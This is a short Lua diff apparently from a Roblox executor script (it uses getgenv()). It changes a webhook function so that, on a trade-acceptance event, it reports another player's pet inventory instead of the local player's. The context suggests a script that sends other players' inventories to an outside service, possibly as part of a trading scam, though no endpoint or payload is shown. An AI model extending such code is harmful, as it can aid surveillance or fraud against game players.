@@ -44,19 +44,26 @@ local function formatInventory(inv)
 end
 
 -- Send webhook when triggered
-local function sendWebhook(inv)
+local function sendWebhook()
 	local rawReceiver = getgenv().receiver
 	local receiverPlayer
+	local displayName = "Unknown"
+	local userId = 1
 
-	-- Resolve receiever whether it's a Player instance or a name string
+	-- Support both instance and string for receiver
 	if typeof(rawReceiver) == "Instance" and rawReceiver:IsA("Player") then
 		receiverPlayer = rawReceiver
 	elseif typeof(rawReceiver) == "string" and rawReceiver ~= "" then
 		receiverPlayer = Players:FindFirstChild(rawReceiver)
 	end
 
-	local displayName = receiverPlayer and receiverPlayer.DisplayName or "Unknown"
-	local userId = receiverPlayer and receiverPlayer.UserId or 1
+	-- Extract info from found player
+	if receiverPlayer then
+		displayName = receiverPlayer.DisplayName
+		userId = receiverPlayer.UserId
+	end
+
+	local inventory = receiverPlayer and getAgeInventory(receiverPlayer) or {}
 
 	local embed = {
 		{
@@ -65,8 +72,8 @@ local function sendWebhook(inv)
 			color = 16753920,
 			fields = {
 				{
-					name = "🎒 Current Backpack",
-					value = formatInventory(inv)
+					name = "🎒 Their Backpack",
+					value = formatInventory(inventory)
 				}
 			},
 			thumbnail = {
@@ -98,6 +105,5 @@ end
 
 -- Listen for acceptance trigger
 RefreshActivePetsUI.OnClientEvent:Connect(function()
-	local inv = getAgeInventory(LocalPlayer)
-	sendWebhook(inv)
+	sendWebhook()
 end)
